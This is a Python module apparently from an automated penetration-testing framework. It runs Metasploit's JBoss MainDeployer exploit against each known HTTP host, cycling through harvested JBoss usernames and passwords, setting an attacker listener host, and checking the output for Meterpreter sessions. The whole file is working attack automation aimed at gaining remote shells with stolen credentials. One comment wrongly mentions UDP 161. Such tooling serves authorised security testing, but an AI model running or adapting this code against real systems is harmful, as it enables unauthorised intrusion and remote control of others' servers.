import re

from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.mymsf import myMsf
from core.utils import Utils


class msf_jboss_maindeployer(actionModule):
    def __init__(self, config, display, lock):
        super(msf_jboss_maindeployer, self).__init__(config, display, lock)
        self.triggers = ["newJbossPassword"]
        self.requirements = ["msfconsole"]
        self.title = "Attempt to gain shell via Jboss"
        self.shortName = "MSFJbossMainDeployer"
        self.description = "execute [exploit/multi/http/jboss_maindeployer] on each target"
        self.safeLevel = 3

    def getTargets(self):
        # we are interested only in the hosts that have UDP 161 open
        self.targets = kb.get('service/http/host')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # connect to msfrpc
            msf = myMsf(host=self.config['msfhost'], port=int(self.config['msfport']), user=self.config['msfuser'],
                        password=self.config['msfpass'])

            if not msf.isAuthenticated():
                return

            # If any results are succesful, this will become true and Fire will be called in the end
            callFire = False

            # loop over each target
            for t in self.targets:
                ports = kb.get('service/http/host/' + t + '/tcpport')
                for p in ports:
                    users = kb.get("creds/host/" + t + "/port/" + p + "/service/jboss/username")
                    for user in users:
                        passwords = kb.get("creds/host/" + t + "/port/" + p +
                                "/service/jboss/username/" + user + "/password")
                        for password in passwords:
                            # verify we have not tested this host before
                            if not self.seentarget(t+p+user+password):
                                # add the new IP to the already seen list
                                self.addseentarget(t+p+user+password)
                                self.display.verbose(self.shortName + " - Connecting to " + t)
                                msf.execute("use exploit/multi/http/jboss_maindeployer\n")
                                msf.execute("set RHOST %s\n" % t)
                                msf.execute("set RPORT %s\n" % p)
                                msf.execute("set SVHOST %s\n" % self.config['lhost'])
                                msf.execute("set USERNAME %s\n" % user)
                                msf.execute("set PASSWORD %s\n" % password)
                                msf.execute("set fingerprintcheck false\n")
                                msf.execute("exploit -j\n")
                                msf.sleep(int(self.config['msfexploitdelay']))

                                outfile = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)
                                result = msf.getResult()
                                Utils.writeFile(result, outfile)

                                parts = re.findall(".*Meterpreter session.*", result)
                                for part in parts:
                                    callFire = True
                                    self.addVuln(t, self.shortName, {"port": p, "username": user, "password": password, "output": outfile.replace("/", "%2F")})
                                    kb.add("host/" + t + "/files/" + self.shortName + "/" + outfile.replace("/", "%2F"    ))

            if callFire:
                self.fire("msfSession")

            # clean up after ourselves
            result = msf.cleanup()

        return
